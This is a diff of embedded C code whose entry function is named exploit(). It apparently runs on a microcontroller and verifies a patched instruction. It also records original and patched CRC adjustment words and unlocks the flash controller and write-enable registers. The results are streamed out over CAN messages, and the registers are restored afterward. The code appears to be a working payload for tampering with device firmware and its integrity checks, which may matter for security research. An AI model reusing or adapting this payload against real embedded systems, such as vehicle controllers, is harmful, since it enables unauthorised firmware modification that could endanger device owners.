@@ -47,50 +47,17 @@ static void duplicate_snapshot(const uint32_t source[8], uint32_t destination[8]
   for (index = 0u; index < 8u; ++index) destination[index] = source[index];
 }
 
-static int wait_fpckar_exact(uint16_t expected, const struct runtime_guard *guard) {
+static int __attribute__((noinline)) wait_register_masked(
+  uint32_t address,
+  uint8_t width,
+  uint32_t mask,
+  uint32_t expected,
+  const struct runtime_guard *guard
+) {
   uint32_t spins = FACI_PE_POLL_LIMIT;
   while (spins != 0u) {
-    if (FACI_FPCKAR == expected) return 0;
-    --spins;
-    if ((spins & 0x3FFFu) == 0u) feed_watchdog(guard);
-  }
-  return 1;
-}
-
-static int wait_flwl_exact(uint32_t expected, const struct runtime_guard *guard) {
-  uint32_t spins = FACI_PE_POLL_LIMIT;
-  while (spins != 0u) {
-    if (FLWL_REG == expected) return 0;
-    --spins;
-    if ((spins & 0x3FFFu) == 0u) feed_watchdog(guard);
-  }
-  return 1;
-}
-
-static int wait_flwe_exact(uint32_t expected, const struct runtime_guard *guard) {
-  uint32_t spins = FACI_PE_POLL_LIMIT;
-  while (spins != 0u) {
-    if (FLWE_REG == expected) return 0;
-    --spins;
-    if ((spins & 0x3FFFu) == 0u) feed_watchdog(guard);
-  }
-  return 1;
-}
-
-static int wait_entry_bit(uint16_t expected, const struct runtime_guard *guard) {
-  uint32_t spins = FACI_PE_POLL_LIMIT;
-  while (spins != 0u) {
-    if ((FACI_FENTRYR & 1u) == expected) return 0;
-    --spins;
-    if ((spins & 0x3FFFu) == 0u) feed_watchdog(guard);
-  }
-  return 1;
-}
-
-static int wait_fpckar_restored(const struct runtime_guard *guard) {
-  uint32_t spins = FACI_PE_POLL_LIMIT;
-  while (spins != 0u) {
-    if ((FACI_FPCKAR & 0x0081u) == 0u) return 0;
+    uint32_t value = width == 2u ? MMIO16(address) : MMIO32(address);
+    if ((value & mask) == expected) return 0;
     --spins;
     if ((spins & 0x3FFFu) == 0u) feed_watchdog(guard);
   }
@@ -98,7 +65,7 @@ static int wait_fpckar_restored(const struct runtime_guard *guard) {
 }
 
 static int send_comprehensive_stream(
-  const uint32_t values[PROTO_CRC_RECORD_COUNT],
+  const uint32_t values[PROTO_DCRA_RECORD_COUNT],
   uint32_t magic0,
   uint32_t magic1,
   const uint32_t snapshots[40],
@@ -114,7 +81,7 @@ static int send_comprehensive_stream(
   if (can_send(PROTO_BEGIN1 | begin | (1u << 24), 2u, guard) != 0) return 2;
   if (stream_probe_region(PROTO_OP_FACI_PE_CYCLE, 0u, TARGET_BASE, guard, &combined_crc) != 0) return 3;
   if (stream_probe_region(PROTO_OP_FACI_PE_CYCLE, 1u, CRC_SECTOR_BASE, guard, &combined_crc) != 0) return 4;
-  for (slot = 0u; slot < PROTO_CRC_RECORD_COUNT; ++slot) {
+  for (slot = 0u; slot < PROTO_DCRA_RECORD_COUNT; ++slot) {
     if (can_send(PROTO_CRC_RECORD | (slot << 8) | (4u << 16), values[slot], guard) != 0) return 5;
   }
   if (can_send(PROTO_MAGIC, magic0, guard) != 0) return 6;
@@ -130,13 +97,10 @@ void exploit(void) __attribute__((section(".text.entry"), used, noreturn));
 
 void exploit(void) {
   struct runtime_guard guard;
-  uint32_t values[PROTO_CRC_RECORD_COUNT];
+  uint32_t values[PROTO_DCRA_RECORD_COUNT];
   uint32_t snapshots[40];
   uint32_t magic0;
   uint32_t magic1;
-  uint32_t prefix_crc;
-  uint32_t new_adjust;
-  uint32_t offset;
   uint16_t primary_code = 0u;
   uint16_t cleanup_code = 0u;
   uint8_t unlock_attempted = 0u;
@@ -149,39 +113,25 @@ void exploit(void) {
   magic0 = MMIO32(MAGIC0_ADDRESS);
   magic1 = MMIO32(MAGIC1_ADDRESS);
   if (magic0 != MAGIC_WORD || magic1 != MAGIC_WORD) primary_code = 1u;
+
   if (primary_code == 0u && !equal_bytes(
     (volatile uint8_t *)(PATCH_ADDRESS - 2u), original_instruction, 4u
   )) primary_code = 2u;
 
-  for (offset = 0u; offset < TARGET_LENGTH; ++offset) {
-    SRAM_BUFFER[offset] = MMIO8(TARGET_BASE + offset);
-  }
-
-  capture_dcra(&values[PROTO_CRC_ENTRY_CTL], &values[PROTO_CRC_ENTRY_COUT]);
-  prefix_crc = crc_prefix_sw(1u, &guard);
-  new_adjust = crc_adjustment(prefix_crc);
-  values[PROTO_CRC_RANGE_START] = CRC_RANGE_START;
-  values[PROTO_CRC_RANGE_END] = CRC_RANGE_END;
-  values[PROTO_CRC_ADJUST_ADDRESS] = CRC_ADJUST;
-  values[PROTO_CRC_OLD_ADJUST_WORD] = MMIO32(CRC_ADJUST);
-  values[PROTO_CRC_PATCHED_PREFIX_SW] = prefix_crc;
-  values[PROTO_CRC_NEW_ADJUST_WORD] = new_adjust;
-  values[PROTO_CRC_ORIGINAL_SW_FULL] = crc_full_sw(0u, 0u, &guard);
-  values[PROTO_CRC_PATCHED_SW_FULL] = crc_full_sw(1u, new_adjust, &guard);
-  values[PROTO_CRC_ORIGINAL_DCRA_RAW] = dcra_full_raw(0u, 0u, &guard);
-  values[PROTO_CRC_PATCHED_DCRA_RAW] = dcra_full_raw(1u, new_adjust, &guard);
-  restore_dcra(values[PROTO_CRC_ENTRY_CTL], values[PROTO_CRC_ENTRY_COUT]);
-  values[PROTO_CRC_EXIT_CTL] = DCRA_CTL;
-  values[PROTO_CRC_EXIT_COUT] = DCRA_COUT;
-  values[PROTO_CRC_SRAM_ECHO_LENGTH] = TARGET_LENGTH;
-  values[PROTO_CRC_SRAM_ECHO_CRC32] = crc_region(SRAM_BUFFER, TARGET_LENGTH, &guard);
+  capture_dcra(&values[PROTO_DCRA_ENTRY_CTL], &values[PROTO_DCRA_ENTRY_COUT]);
+  values[PROTO_DCRA_RANGE_START] = CRC_RANGE_START;
+  values[PROTO_DCRA_RANGE_END] = CRC_RANGE_END;
+  values[PROTO_DCRA_ADJUST_ADDRESS] = CRC_ADJUST;
+  values[PROTO_DCRA_OLD_ADJUST_WORD] = MMIO32(CRC_ADJUST);
+  values[PROTO_DCRA_NEW_ADJUST_WORD] = CRC_PATCHED_ADJUST_WORD;
+  values[PROTO_DCRA_ORIGINAL_RAW] = dcra_full_raw(0u, &guard);
+  values[PROTO_DCRA_PATCHED_RAW] = dcra_full_raw(1u, &guard);
+  restore_dcra(values[PROTO_DCRA_ENTRY_CTL], values[PROTO_DCRA_ENTRY_COUT]);
+  values[PROTO_DCRA_EXIT_CTL] = DCRA_CTL;
+  values[PROTO_DCRA_EXIT_COUT] = DCRA_COUT;
   if (primary_code == 0u
-      && (values[PROTO_CRC_ORIGINAL_SW_FULL] != 0xFFFFFFFFu
-      || values[PROTO_CRC_ORIGINAL_DCRA_RAW] != 0xFFFFFFFFu
-      || values[PROTO_CRC_PATCHED_SW_FULL] != 0xFFFFFFFFu
-      || values[PROTO_CRC_PATCHED_DCRA_RAW] != 0xFFFFFFFFu
-      || values[PROTO_CRC_EXIT_CTL] != values[PROTO_CRC_ENTRY_CTL]
-      || values[PROTO_CRC_EXIT_COUT] != values[PROTO_CRC_ENTRY_COUT])) {
+      && (values[PROTO_DCRA_EXIT_CTL] != values[PROTO_DCRA_ENTRY_CTL]
+      || values[PROTO_DCRA_EXIT_COUT] != values[PROTO_DCRA_ENTRY_COUT])) {
     primary_code = 3u;
   }
 
@@ -196,7 +146,9 @@ void exploit(void) {
     unlock_attempted = 1u;
     FACI_FPCKAR = 0xAA01u;
     syncp();
-    if (wait_fpckar_exact(0x0001u, &guard) != 0) primary_code = 5u;
+    if (wait_register_masked(0xFFA10084u, 2u, 0xFFFFu, 0x0001u, &guard) != 0) {
+      primary_code = 5u;
+    }
     capture_snapshot(&snapshots[8]);
     if (primary_code != 0u) goto cleanup;
 
@@ -205,8 +157,13 @@ void exploit(void) {
     flwe_attempted = 1u;
     FLWE_REG = 1u;
     syncp();
-    if (wait_flwl_exact(1u, &guard) != 0) primary_code = 6u;
-    if (primary_code == 0u && wait_flwe_exact(1u, &guard) != 0) primary_code = 7u;
+    if (wait_register_masked(0xFFF8A430u, 4u, 0xFFFFFFFFu, 1u, &guard) != 0) {
+      primary_code = 6u;
+    }
+    if (primary_code == 0u
+        && wait_register_masked(0xFFF82410u, 4u, 0xFFFFFFFFu, 1u, &guard) != 0) {
+      primary_code = 7u;
+    }
     capture_snapshot(&snapshots[16]);
     if (primary_code != 0u) goto cleanup;
 
@@ -214,7 +171,9 @@ void exploit(void) {
     fentry_attempted = 1u;
     FACI_FENTRYR = 0x5501u;
     syncp();
-    if (wait_entry_bit(1u, &guard) != 0) primary_code = 9u;
+    if (wait_register_masked(0xFFA10088u, 2u, 1u, 1u, &guard) != 0) {
+      primary_code = 9u;
+    }
     capture_snapshot(&snapshots[24]);
   }
 
@@ -226,10 +185,22 @@ cleanup:
   if (fentry_attempted != 0u) FACI_FENTRYR = 0x5500u;
   if (unlock_attempted != 0u) FACI_FPCKAR = 0xAA00u;
   syncp();
-  if (flwl_attempted != 0u && wait_flwl_exact(0u, &guard) != 0) cleanup_code |= 0x0001u;
-  if (flwe_attempted != 0u && wait_flwe_exact(0u, &guard) != 0) cleanup_code |= 0x0002u;
-  if (fentry_attempted != 0u && wait_entry_bit(0u, &guard) != 0) cleanup_code |= 0x0004u;
-  if (unlock_attempted != 0u && wait_fpckar_restored(&guard) != 0) cleanup_code |= 0x0008u;
+  if (flwl_attempted != 0u
+      && wait_register_masked(0xFFF8A430u, 4u, 0xFFFFFFFFu, 0u, &guard) != 0) {
+    cleanup_code |= 0x0001u;
+  }
+  if (flwe_attempted != 0u
+      && wait_register_masked(0xFFF82410u, 4u, 0xFFFFFFFFu, 0u, &guard) != 0) {
+    cleanup_code |= 0x0002u;
+  }
+  if (fentry_attempted != 0u
+      && wait_register_masked(0xFFA10088u, 2u, 1u, 0u, &guard) != 0) {
+    cleanup_code |= 0x0004u;
+  }
+  if (unlock_attempted != 0u
+      && wait_register_masked(0xFFA10084u, 2u, 0x0081u, 0u, &guard) != 0) {
+    cleanup_code |= 0x0008u;
+  }
   capture_snapshot(&snapshots[32]);
   if (!snapshots_equal(&snapshots[0], &snapshots[32])) cleanup_code |= 0x0010u;
 
